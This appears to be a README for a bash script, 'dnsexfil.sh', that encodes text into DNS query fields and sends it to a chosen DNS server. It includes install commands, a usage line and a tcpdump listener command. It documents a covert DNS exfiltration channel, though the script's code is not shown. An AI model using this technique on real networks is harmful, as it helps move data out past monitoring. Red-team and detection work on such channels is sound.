# DNS Text Sender Script

This bash script allows you to send the contents of a text variable using the DNS protocol. The text is broken into chunks and embedded into the DNS query field. If the text is too long for the maximum payload size, it is broken into multiple packets. The script allows you to specify the destination DNS server and sends the text 10 times in a row.

## Prerequisites

Ensure you have `dig` installed on your system. You can install it using your package manager if it's not already installed:

- Debian-based systems:
  ```sh
  sudo apt-get install dnsutils

- Red Hat systems:
  ```sh
  sudo yum install bind-utils

## Usage

  ```sh
  chmod +x dnsexfil.sh
  ./dnsexfil.sh "Your text to send" "dns.server.address"

## Set up a listener with TCPDUMP

  ```
  sudo tcpdump -i eth0 udp port 53 -vvv


